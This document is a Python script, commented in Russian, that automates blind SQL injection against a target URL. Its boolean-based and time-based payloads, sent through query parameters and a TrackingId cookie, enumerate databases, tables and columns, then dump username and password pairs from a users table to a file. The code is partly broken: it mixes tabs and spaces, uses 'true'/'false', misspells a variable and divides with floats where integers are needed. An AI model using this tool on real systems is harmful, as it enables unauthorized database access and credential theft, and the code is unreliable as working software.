from optparse import OptionParser
import sys
import requests
import hashlib
import string
import requests
import logging
import argparse
import sys
from time import sleep
from binascii import hexlify
import re
from urllib import parse
import time

chars=string.ascii_uppercase + string.digits
"""
Kак только мы собираемся передать персональную информацию на сервер, нам необходимо каким-то образом сделать так, 
чтобы сервер ассоциировал все наши запросы именно с нами, 
и в будущем верно определял все исходящие от нас запросы
Kогда требуется персонализировать запросы от одного клиента, мы будем использовать сессии
Сессия (session) – это некоторый отрезок во времени, в пределах которого веб-приложение может определять все запросы от одного клиента.
"""
s = requests.Session() 
s.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"

"""
делаем get http запрос и получаем
result.content -  который выводит содержимое запроса в байтах
"""
def http_get(url):
    result = s.get(url)
    return result.content

def check_injectionBool(url):
    hash_url = md5(http_get(url))
    test_query = 'and 1=1 --'
    new_url = url + test_query
    hash_new_url = md5(http_get(new_url))
    if hash_url == hash_new_url:
        print("Boolean-based SQL injection was detected")
    else:
        print("There is NO Boolean-based SQLi")

def check_injectionTime(url):
    sleep = 2
    test_query = ' AND (SELECT IF(length("a") = 1,sleep(%s),"Null"))' % sleep
    new_url = url + test_query
    req = requests.get(new_url)
    time = req.elapsed.total_seconds()
    if time > sleep:
        print("Time-based SQL injection was detected")
        return true
    else:
        print("There is NO Time-based SQLi")
        return false

parser=OptionParser()

parser.add_option("-D", "--database", action="store",type="string",dest="database",help="Please input test databases")
parser.add_option("-T", "--table",action="store",type="string",dest="table",help="Please input test table")
parser.add_option("-C", "--column",action="store",type="string",dest="column",help="Please input test column")
parser.add_option("-u","--url", action="store",type="string",dest="url",help="Please input test url")
parser.add_option("-c","--cookie", action="store",type="string",dest="cookie",help="Please input cookie")

(options,args) = parser.parse_args()

def main():
    if options.url == None and options.database == None and options.table == None and options.column == None and options.cookie == None:
        print("Please read the help")
        parser.print_help()
        sys.exit()
    else:
        print("SQLi[B/T]")
        w = input()
        if w=="B":
            if options.url != None and options.database ==None and options.table == None and options.column == None and options.cookie == None:
                check_injectionBool(options.url)
                get_all_databases(options.url)
            elif  options.url != None and options.database !=None and options.table == None and options.column == None and options.cookie == None:
                get_db_all_tables(options.url, options.database)
            elif  options.url != None and options.database !=None and options.table != None and options.column == None and options.cookie == None:
                get_db_tb_all_columns(options.url, options.database, options.table)
            #elif options.url != None and options.database == None and options.table == None and options.column == None and options.cookie != None:
            #    dump(options.url, options.cookie)
        else:
            if options.url != None and options.database ==None and options.table == None and options.column == None and options.cookie == None:
                if check_injectionTime(options.url):
                    get_database(options.url)
                    get_tables_number(options.url)
                    get_tables(options.url)
	    elif options.url != None and options.database == None and options.table == None and options.column == None and options.cookie != None:
                dumpTime(options.url, options.cookie)
		
"""
(1) Получаем число баз данных и их количество
Формируем payload, в котором считаем количество баз данных 
Функция COUNT (*) возвращает количество строк в указанной таблице с учетом повторяющихся строк. Она подсчитывает каждую строку отдельно. 
При этом учитываются и строки, содержащие значения NULL.
INFORMATION_SCHEMA база данных в пределах каждого экземпляра MySQL, место, которое хранит информацию обо всех других базах данных, которые поддерживает сервер MySQL. 
INFORMATION_SCHEMA содержит несколько таблиц только для чтения. 
Они фактически представления, не базовые таблицы, таким образом нет никаких файлов, 
связанных с ними, и Вы не можете установить триггеры на них. 
Кроме того, нет никакого каталога базы данных с этим именем.
The INFORMATION_SCHEMA SCHEMATA Table
A schema is a database, so the SCHEMATA table provides information about databases.
The SCHEMATA table has these columns:
CATALOG_NAME
The name of the catalog to which the schema belongs. This value is always def. <- то что я использую
SCHEMA_NAME 
The name of the schema.
DEFAULT_CHARACTER_SET_NAME
The schema default character set.
DEFAULT_COLLATION_NAME
The schema default collation
SQL_PATH
This value is always NULL.
DEFAULT_ENCRYPTION
"""
def get_all_databases(url): # (1)
	db_nums_payload = "select count(schema_name) from information_schema.schemata" 
	db_numbers = half(url, db_nums_payload)
	print("The total number of databases is: %d"% db_numbers)
	for x in range(db_numbers):
		# Функция LENGTH используется для подсчета количества символов в строках.
		db_len_payload = "select length(schema_name) from information_schema.schemata limit %d,1" % x 
		db_name_numbers = half(url, db_len_payload) # получаем длину строк

		db_name = ""
		for y in range(1,db_name_numbers+1): 
			# Для каждого символа сравниваем значение его ascii кода с кодами заданного нами диапазона
		 	db_name_payload = "ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))" % (x,y)
			# Переводим в строку
		 	db_name += chr(half(url,db_name_payload))

		print("The %d database is: %s"% (x+1, db_name))

def get_db_all_tables(url,database):
    # считаем количество таблиц
    tb_nums_payload = "select count(table_name) from information_schema.tables where table_schema = '%s'" % database 
    tb_numbers = half(url,tb_nums_payload)
    print("The number of tables in the %s database is: %d"% (database,tb_numbers))

    for x in range(tb_numbers):
	# Функция LENGTH используется для подсчета количества символов в строках.
        tb_len_payload  = "select length(table_name) from information_schema.tables where table_schema = '%s' limit %d,1" % (database,x)

        tb_name_numbers = half(url,tb_len_payload)
        #print(tb_name_numbers)
        tb_name = ""
        for y in range(1,tb_name_numbers+1):
	    # Для каждого символа сравниваем значение его ascii кода с кодами заданного нами диапазона
            tb_name_payload = "ascii(substr((select table_name from information_schema.tables where table_schema = '%s' limit %d,1),%d,1))" % (database,x,y)
            #print(tb_name_payload)
	    # Переводим в строку
            tb_name += chr(half(url,tb_name_payload))
            #print(tb_name)
            print(database,"The %d table in the database is: %s"% (x+1,tb_name))

def get_db_tb_all_columns(url,database,table):
    # считаем клоичество столбцов
    co_nums_payload = "select count(column_name) from information_schema.columns where table_schema = '%s' and table_name = '%s'" % (database,table)
    co_numbers = half(url,co_nums_payload)
    print("The number of fields in the %s table in the %s database is: %d"% (database,table,co_numbers))
    for x in range(co_numbers):
	# Функция LENGTH используется для подсчета количества символов в строках.
        co_len_payload  = "select length(column_name) from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1" % (database,table,x)
        co_name_numbers = half(url,co_len_payload)

        co_name = ""
        for y in range(1,co_name_numbers+1):
	    # Для каждого символа сравниваем значение его ascii кода с кодами заданного нами диапазона
            co_name_payload = "ascii(substr((select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1),%d,1))" % (database,table,x,y)
            # Переводим в строку
	    co_name += chr(half(url,co_name_payload))
            print(database,"in the database",table,"the name of the %d field in the table: %s"% (x+1,co_name))
"""
md5 используется для хеширования данных
"""
def md5(str):
    #  функция хеширования принимает только последовательность байтов в качестве параметра
    hl = hashlib.md5()
    # Передать последовательность байтов можно также с помощью метода update(). В этом случае объект присоединяется к предыдущему значению
    hl.update(str)
    # Получить зашифрованную последовательность байтов и строку позволяет hexdigest()
    return hl.hexdigest()
"""
(*) Хэшируем result.content, который выводит содержимое запроса в байтах, 
и получаем безопасный хеш(дайджест), возвращаемый, 
как строковый объект двойной длины, содержащий только шестнадцатеричные цифры.
"""
def half(url,payload): # Итеративный метод двоичного поиска
    low = 0
    high = 126
    standard_html = md5(http_get(url)) # (1)
    #print(standard_html)
    while low <= high:
        mid=(low + high)/2
        mid_num_payload = url + " and (%s) > %d-- " % (payload,mid) # берем середину mid и сравниваем с payload
        #print(mid_num_payload)
        mid_html = md5(http_get(mid_num_payload))
        #print(mid_html)
        if mid_html == standard_html: # сужаем диапазон в теле if
            low = mid + 1
        else:
            high = mid - 1 
    mid_num = int((low+high+1)/2)
    return mid_num

def dumpTime(url, TrackingId):
    # создаем массив, в который входят payload
    queries = [
        "SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()",
        "SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='{}'",
        "SELECT CONCAT({},'::',{}) FROM {}"
    ]
    value = 102 # берем значение
    upperlimit = 176 # определяем диапазон 
    lowerlimit = 31 
    operator = ">" # выбираем оператор

    pattern = "Welcome back" # pattern возвращаемый web-приложением 
    query = queries[0] # задаем значение первого запроса 
    row = 0 
    charNum = 1 # число символoв в запросе с LIMIT
    timeoutDelay = 10 # задержка по времени
    timehascome = 0 
    count = 1 
    word = list() # создаем листы
    result = list()
    try:
        r = requests.get(url, timeout=timeoutDelay, allow_redirects=False) # делаем запрос
        if r.status_code != 200:
            print(f"[-] An Error occured, HTTP (GET) response status: {r.status_code}") # если страница выдает ошибку, то выводим сообщение
            exit(1)
        filename = f"sqli-dumped-data_{parse.urlsplit(url)[1]}_.txt" # создаем файл, вкоторый сохраним все скомпрометированные данные из таблицы
        now = time.localtime() # фиксируем время 
	"""
	Функция time() модуля time вернет время в секундах с начала эпохи как число с плавающей запятой.
        Конкретная дата эпохи и обработка високосных секунд зависит от платформы. В Windows и большинстве 
        систем Unix периодом времени является 1 января 1970 года, 00:00:00 (UTC), 
        и високосные секунды не учитываются во времени с начала эпохи. Это обычно называют временем Unix.
	"""
        start = time.time() 
        with open(filename, "w") as f:
            f.write(f"[i] Started in: {time.strftime('%Y/%m/%d %H:%M:%S', now)}\n-----------------------------------\n")
            print(f"[i] Log file created: {filename}")
        print(f"[*] Starting binary search with the query: {query};\n")
        while True:
            payload = f"'AND ASCII(SUBSTRING(({query} LIMIT 1 OFFSET {row}),{charNum},1)) {operator} {value}--"
            cookie = {"TrackingId": TrackingId + payload}
            r = requests.get(url, cookies=cookie, timeout=timeoutDelay, allow_redirects=False)
            count += 1
            if r.status_code == 200:
                if pattern in r.text:
                    lowerlimit = value
                    value = (value+upperlimit)/2
                    if (upperlimit-value) <= 1:
                        operator = "="
                        possibleValue1 = round(upperlimit)
                        possibleValue2 = round(value)
                        value = possibleValue1
                        payload = f"'AND ASCII(SUBSTRING(({query} LIMIT 1 OFFSET {row}),{charNum},1)) {operator} {value}--"
                        cookie = {"TrackingId": TrackingId + payload}
                        r = requests.get(url, cookies=cookie, timeout=timeoutDelay, allow_redirects=False)
                        count += 1
                        if r.status_code == 200 and pattern in r.text:
                            char = chr(value)
                            print(f"[+] {charNum}. character of {row+1}. row has been dumped: {char}")
                            charNum += 1
                            value = 102
                            upperlimit = 176
                            lowerlimit = 31
                            operator = ">"

                        elif r.status_code == 200 and pattern not in r.text:
                            value = possibleValue2
                            payload = f"'AND ASCII(SUBSTRING(({query} LIMIT 1 OFFSET {row}),{charNum},1)) {operator} {value}--"
                            cookie = {"TrackingId": TrackingId + payload}
                            r = requests.get(url, cookies=cookie, timeout=timeoutDelay, allow_redirects=False)
                            count += 1
                            if pattern in r.text:
                                char = chr(value)
                                print(f"[+] {charNum}. character of {row+1}. row has been dumped: {char}")
                                charNum += 1
                                value = 102
                                upperlimit = 176
                                lowerlimit = 31
                                operator = ">"

                            else:
                                print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
                                exit(1)
                        else:
                            print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
                            exit(1)
                        word.append(char)
                        print(f"[+] Word ==> {''.join(word)}\n")
                elif pattern not in r.text:
                    upperlimit = value
                    value = (lowerlimit+value)/2
                    if (value-31) <= 1:
                        result.append(''.join(word))
                        if result[len(result)-1] == '':
                            timehascome += 1
                            del result[-1]
                            result.append("\n")
                            if "\n\n" in ''.join(result):
                                fileContent = [
                                    query, ";\n",
                                    ''.join(result).split("\n\n")[timehascame-1],
                                    "\n\n",
                                ]
                                with open(filename, "a") as f:
                                    f.writelines(fileContent)
                                    print(f"[*] Dumped data written to: {filename}\n")
                            del result[-1]
                            if timehascome == 1:
                                t = re.compile(".*users*.", re.IGNORECASE)
                                table_name = list(filter(t.search, result))[0]
                                query = queries[1].format(table_name)
                            elif timehascome == 2:
                                u = re.compile(".*username*.", re.IGNORECASE)
                                p = re.compile(".*password*.", re.IGNORECASE)
                                usernameColumn = list(filter(u.search, result))[0]
                                passwordColumn = list(filter(p.search, result))[0]
                                query = queries[2].format(usernameColumn, passwordColumn, table_name)
                            elif timehascome == 3:
                                now = time.localtime()
                                end = time.time()
                                print(f"[*] No more rows is being returned from current query!\n[*] No other query remained!")
                                with open(filename, "a") as f:
                                    f.write(f"------------------------------------\n[i] Finished in: {time.strftime('%Y/%m/%d %H:%M:%S', now)}\n[i] Took {round((end - start)/60)} minutes.\n[i] {count} HTTP requests sent in total.\n[i] {round(count/(end - start),1)} request per second.\n")
                                with open(filename, "r") as f:
                                    print(f"\n\n{filename}\n{''.join('=' for i in range(len(filename)))}\n{f.read()[:-1]}\n\n    Exited!\n")
                                exit()
                            row = -1
                            print(f"[*] No more rows is being returned from current query!\n[*] Continuing with the next query: {query};\n")
                        result.append("\n")
                        print(f"[*] Dumped data so far:\n{''.join(result)}")
                        word.clear()
                        row += 1
                        charNum = 1
                        value = 102
                        upperlimit = 176
                        lowerlimit = 31
                        operator = ">"

            else:
                print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
                exit(1)
    except KeyboardInterrupt:
        print("\n\n    Keyboard interrupt, exited!\n")
        exit()
    except Exception as e:
        print(f"\n[-] Program failed because of: {e}\n")

def get_database(url):
    dbname = ""
    database_length = 0
    sleep = 2
    for i in range(200):
        lenquery = ' OR (SELECT IF(length(database()) = %s,sleep(%s),"Null"))' % (i, sleep)
        final_url = url+lenquery
        req = requests.get(final_url)
        time = req.elapsed.total_seconds()
        if time > sleep:
            database_length = i
            break
    for position in range(1, database_length+1):
        for char in chars:
            query = ' AND (SELECT IF(substr(database(),%s,1) like "%s",sleep(%s),"Null"))' % (position, char, sleep)
            final_url = url+query
            req = requests.get(final_url)
            time = req.elapsed.total_seconds()
            if time > sleep:
                dbname += char
                break
            print("The database is %s "% dbname)

def get_tables(url):
    temp_table_name = ""
    for counter in range(0, get_tables_number(url)+1):
        for tchar in range(10):
            for char in chars:
                query = ' AND (SELECT IF(ASCII(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema = database() LIMIT %s,1),%s,1)) LIKE ASCII("%s"),sleep(%s),"Null"))' % (counter, tchar, char, 2)
                final_url = url + query
                req = requests.get(final_url)
                time = req.elapsed.total_seconds()
                if time > 2:
                    temp_table_name += char
        if temp_table_name != "":
            print("The name of a table is %s"% temp_table_name)


def get_tables_number(url):
    sleep = 2
    for digit in range(20):
        query = ' AND (SELECT IF(substr((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database()),1,1) = %s,sleep(%s),"Null"))' % (digit, sleep)
        final_url = url + query
        req = requests.get(final_url)
        time = req.elapsed.total_seconds()
        if time > sleep:
            print("The number of tables is %d" % digit)

if __name__ == '__main__':
    main()
